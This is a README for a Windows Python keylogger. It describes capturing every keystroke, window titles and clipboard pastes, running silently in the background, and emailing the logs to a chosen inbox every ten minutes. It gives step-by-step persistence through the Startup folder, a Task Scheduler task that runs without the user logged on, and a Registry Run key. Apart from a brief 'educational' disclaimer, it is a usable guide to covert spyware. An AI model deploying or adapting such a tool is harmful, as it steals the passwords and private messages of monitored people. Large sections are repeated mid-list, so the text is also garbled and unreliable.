# KEYLOGGER v3.14
⚠️⚠️⚠️ **LEGAL WARNING** ⚠️⚠️⚠️
This software is provided for **EDUCATIONAL and RESEARCH purposes only**. 
The author is not responsible for any illegal use of this tool. 
This program is designed exclusively for **Windows** operating systems.
## Acknowledgements
This project is a modern, rewritten version of the example found in **[Black Hat Python, 2nd Edition](https://nostarch.com/black-hat-python2E)**. 
- **Major Updates**: Fully compatible with **Python 3.14**.
- **Key Improvements**: Migrated from `pyWinhook` to `pynput` for event handling and implemented **Unicode (Wide) Windows API** via `ctypes` to support multi-language window titles (e.g., Traditional Chinese).
## Features
* **Real-time Keylogging**: Captures all keystrokes including special keys.
* **Window Tracking**: Logs the Process ID (PID), executable name, and active window title.
* **Clipboard Monitoring**: Automatically captures content when `Ctrl+V` is pressed.
* **Dual Operation Modes**: Choose between Local-Only storage or Auto-Email transmission upon startup.
* **Background Mode**: Supports `.pyw` execution for silent operation.
* **Email Transmission**: Automatically exfiltrates `log.txt` via SMTP every 10 minutes.
* **Fail-Safe Hygiene**: The local `log.txt` is only reset after a successful email delivery to prevent data loss.
* **Encrypted Communication**: Uses `STARTTLS` (Port 587) to ensure credentials and logs are encrypted during transit.
* **Secure Credentialing**: Implements a GUI-based configuration for App Passwords, avoiding hardcoded secrets in the source code.
## Prerequisites

Ensure you have Python 3.x installed. Run the following commands to set up the dependencies:

**Option 1: Automated Setup (Recommended)**

Run the included batch script as **Administrator** to install all dependencies and configure Windows system files:
double-click `install.bat`.

---

**Option 2: Manual Installation**

If you prefer not to use the batch script, run the following commands in an elevated Command Prompt:
```bash
# Recommended installation command
python -m pip install pynput pywin32
python -m pywin32_postinstall -install
```
## Setup for Email Transmission (Gmail)
To enable the automated report feature, you must use a **Google App Password**:
1. Enable **2-Step Verification** on your Google Account.
2. Go to **Security** > **App Passwords**.
3. Generate a new **16-digit code**. This is the password you will enter when the program starts.
4. **Note**: Use a dedicated "burner" account for testing to maintain personal account hygiene.
## Usage
1. Save the script as `keylogger.pyw` for silent background execution.
2. Run the script. A configuration dialog will appear.
3. Enter your **Receiver Email** and the **16-digit App Password**.
4. The program will now run in the background, logging keystrokes and window activity.
5. Check your inbox every 10 minutes for the `Keylogger Report`.
6. **To Terminate**: Since the program runs in background mode, you must close it via **Windows Task Manager**  (Ctrl+Shift+Esc) by ending the `python.exe` process.

## Auto-Start on Windows Boot

To have `keylogger.pyw` launch automatically when Windows starts, use one of the following methods:

### Method 1: Startup Folder (Simplest)

1. Press `Win + R` and enter:
   ```
   shell:startup
   ```
2. Place your `keylogger.pyw` file (or a shortcut to it) into this folder.
3. The script will run automatically on the next login.

> ✅ Easiest setup — no admin rights required.  
> ⚠️ Only runs after user login; applies to current user only.

---

### Method 2: Task Scheduler (Recommended)

Offers the most flexibility — can run at boot, before login, or with a delay.

1. Open **Task Scheduler** (search in Start Menu).
2. Click **"Create Basic Task"** in the right panel.
3. Set the trigger to **"When the computer starts"** or **"When I log on"**.
4. Set the action to **"Start a program"**.
5. In the **Program/script** field, enter `pythonw.exe`.
6. In the **Add arguments** field, enter the full path to your script:
   ```
   C:\path\to\keylogger.pyw
   ```
7. Complete the wizard and save.

> ✅ Supports delayed start (useful to wait for network initialization).  
> ✅ Can run without user login by selecting **"Run whether user is logged on or not"**.

---

### Method 3: Registry Run Key

1. Press `Win + R` and enter `regedit`.
2. Navigate to:
   ```
   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   ```
3. Right-click → **New** → **String Value**.
4. Name it anything (e.g., `KeyloggerService`), and set the value to:
   ```
   "C:\Windows\py.exe" "C:\path\to\keylogger.pyw"
   ```

> ✅ Lightweight and persistent.  
> ⚠️ Edit the registry with caution.

---

### Comparison

| Method | Requires Login | Admin Required | Recommended For |
|--------|---------------|----------------|-----------------|
| Startup Folder | ✅ Yes | ❌ No | Quick testing |
| Task Scheduler | Optional | ✅ Yes | Production / stable use |
| Registry | ✅ Yes | ❌ No | Lightweight persistent setup |

## Data Structure
The `log.txt` (and the corresponding email body) is structured as follows:
* **Header**: Contains PID, Process Name, and Window Title (Unicode supported).
* **Body**: Captured keystrokes, including Numpad digits (0-9) and special keys.
* **Clipboard**: Records content whenever `Ctrl+V` is detected.
## Sample Output Structure
```text
[ PID: 1234 - notepad.exe - 無標題 - 記事本 ]
Hello world! [Enter] 
[ PID: 5678 - chrome.exe - Google 搜尋 ]
How to use Python [Enter]
[PASTE] - https://github.com/091cc/keylogger
```
_Last update: April 2026 | Version: KEYLOGGER v3.14_
3. Generate a new **16-digit code**. This is the password you will enter when the program starts.
4. **Note**: Use a dedicated "burner" account for testing to maintain personal account hygiene.
## Usage
1. Save the script as `keylogger.pyw` for silent background execution.
2. Run the script. A configuration dialog will appear.
3. Enter your **Receiver Email** and the **16-digit App Password**.
4. The program will now run in the background, logging keystrokes and window activity.
5. Check your inbox every 10 minutes for the `Keylogger Report`.
6. **To Terminate**: Since the program runs in background mode, you must close it via **Windows Task Manager**  (Ctrl+Shift+Esc) by ending the `python.exe` process.

## Auto-Start on Windows Boot

To have `keylogger.pyw` launch automatically when Windows starts, use one of the following methods:

### Method 1: Startup Folder (Simplest)

1. Press `Win + R` and enter:
   ```
   shell:startup
   ```
2. Place your `keylogger.pyw` file (or a shortcut to it) into this folder.
3. The script will run automatically on the next login.

> ✅ Easiest setup — no admin rights required.  
> ⚠️ Only runs after user login; applies to current user only.

---

### Method 2: Task Scheduler (Recommended)

Offers the most flexibility — can run at boot, before login, or with a delay.

1. Open **Task Scheduler** (search in Start Menu).
2. Click **"Create Basic Task"** in the right panel.
3. Set the trigger to **"When the computer starts"** or **"When I log on"**.
4. Set the action to **"Start a program"**.
5. In the **Program/script** field, enter `pythonw.exe`.
6. In the **Add arguments** field, enter the full path to your script:
   ```
   C:\path\to\keylogger.pyw
   ```
7. Complete the wizard and save.

> ✅ Supports delayed start (useful to wait for network initialization).  
> ✅ Can run without user login by selecting **"Run whether user is logged on or not"**.

---

### Method 3: Registry Run Key

1. Press `Win + R` and enter `regedit`.
2. Navigate to:
   ```
   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   ```
3. Right-click → **New** → **String Value**.
4. Name it anything (e.g., `KeyloggerService`), and set the value to:
   ```
   "C:\Windows\py.exe" "C:\path\to\keylogger.pyw"
   ```

> ✅ Lightweight and persistent.  
> ⚠️ Edit the registry with caution.

---

### Comparison

| Method | Requires Login | Admin Required | Recommended For |
|--------|---------------|----------------|-----------------|
| Startup Folder | ✅ Yes | ❌ No | Quick testing |
| Task Scheduler | Optional | ✅ Yes | Production / stable use |
| Registry | ✅ Yes | ❌ No | Lightweight persistent setup |

## Data Structure
The `log.txt` (and the corresponding email body) is structured as follows:
* **Header**: Contains PID, Process Name, and Window Title (Unicode supported).
* **Body**: Captured keystrokes, including Numpad digits (0-9) and special keys.
* **Clipboard**: Records content whenever `Ctrl+V` is detected.
## Sample Output Structure
```text
[ PID: 1234 - notepad.exe - 無標題 - 記事本 ]
Hello world! [Enter] 
[ PID: 5678 - chrome.exe - Google 搜尋 ]
How to use Python [Enter]
[PASTE] - https://github.com/091cc/keylogger
```
_Last update: April 2026 | Version: KEYLOGGER v3.14_

## Usage
1. Save the script as `keylogger.pyw` for silent background execution.
2. Run the script. A configuration dialog will appear.
3. Enter your **Receiver Email** and the **16-digit App Password**.
4. The program will now run in the background, logging keystrokes and window activity.
5. Check your inbox every 10 minutes for the `Keylogger Report`.
6. **To Terminate**: Since the program runs in background mode, you must close it via **Windows Task Manager**  (Ctrl+Shift+Esc) by ending the `python.exe` process.

## Data Structure
The `log.txt` (and the corresponding email body) is structured as follows:
* **Header**: Contains PID, Process Name, and Window Title (Unicode supported).
* **Body**: Captured keystrokes, including Numpad digits (0-9) and special keys.
* **Clipboard**: Records content whenever `Ctrl+V` is detected.

## Sample Output Structure
```text
[ PID: 1234 - notepad.exe - 無標題 - 記事本 ]
Hello world! [Enter] 
[ PID: 5678 - chrome.exe - Google 搜尋 ]
How to use Python [Enter]
[PASTE] - https://github.com/091cc/keylogger
```

_Last update: April 2026 | Version: KEYLOGGER v3.14_
